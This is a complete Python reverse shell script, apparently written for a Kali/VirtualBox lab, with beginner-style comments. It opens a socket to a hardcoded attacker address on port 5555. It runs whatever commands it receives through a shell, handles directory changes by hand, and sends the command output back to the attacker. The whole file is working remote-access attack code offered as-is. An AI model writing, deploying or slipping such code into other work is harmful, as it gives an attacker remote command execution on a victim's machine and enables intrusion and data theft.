import subprocess
import sys
import socket
import os


kali_ip = "10.0.2.15" #This IP can be different on your virtual box
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((kali_ip, 5555))
s.send("Connected!\n".encode()) #encode() is needed to convert your string input to bytes to be transferred over the network
while True:

	received_data = s.recv(1024).decode() #decode() is needed to convert your byte result to string to be displayed
	print(received_data)
	if(received_data.strip() == "&"):
		 break
		 
	#interactive commands like cd do not work for reverse shell, so we need to manually input the command from the client side
	elif(received_data.startswith("cd ")):
		directory = received_data[3:].strip()#extract the folder name after "cd " and strip and whitespaces
		try:
			os.chdir(directory) 
			s.send(f"Directory changed to {directory} \n".encode())
		except Exception as e:
			s.send(f"Failed to change directory: {str(e)}\n".encode())
		
	else:
		#redireect io to a pipe
		result = subprocess.Popen(received_data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, cwd=os.getcwd())
		
		#capture stdout and stderr
		output, error = result.communicate()
		
		out = output + error
		s.send(out)

s.close()


